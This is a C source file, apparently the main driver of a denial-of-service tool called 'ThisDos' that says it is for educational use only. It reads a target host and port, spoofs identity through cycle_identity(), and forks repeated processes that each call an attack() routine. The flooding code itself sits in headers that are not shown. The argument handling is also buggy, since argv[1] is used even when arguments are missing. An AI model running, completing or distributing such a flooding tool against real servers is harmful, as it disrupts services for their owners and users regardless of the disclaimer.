/*
This program is licensed under the GNU General Public License v3.
Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
See https://www.gnu.org/licenses/gpl-3.0.html for details.
*/
#ifdef __WIN32__
#warning "Running thisdos on the windows is not recommended,please visit the page https://github.com/HeisenbergCipherCracker/ThisDos to see the installation guide."
#endif
#include "libz/basedos.h"
#include "libz/common.h"
#include "libwebutil/ping.h"
#include "libwebutil/findport.h"

#include <stdio.h>
#include <string.h>
#include <stdbool.h>


static const char first_msg[] = 
"ThisDos Project"
"A tool designed to perform Dos attacks,only for educational purposes, not illegal!"
"It is user end responsibility to obey the federal laws to ensure that this program does not make any harm to any server";
static const char help_me[] = 
"\nfirst parameter should be target"
"\nsecond parameter should be port to perform attack"
"\nuse --help for help menu";


int main(int argc, char **argv) {
	printf(first_msg);
	print_program_banner();
	int x;
	for (int i = 0;i< argc;i++){
		if (strcmp(argv[i],"--help") == 0){
			printf(help_me);
			exit(0);
		}


	}
	if(argc <3){
		cycle_identity();
	}
	for(x=0; x != THREADS; x++) {
		if(fork())
			attack(argv[1], argv[2], x);
		usleep(250000);
	}
	getc(stdin);
	return 0;
}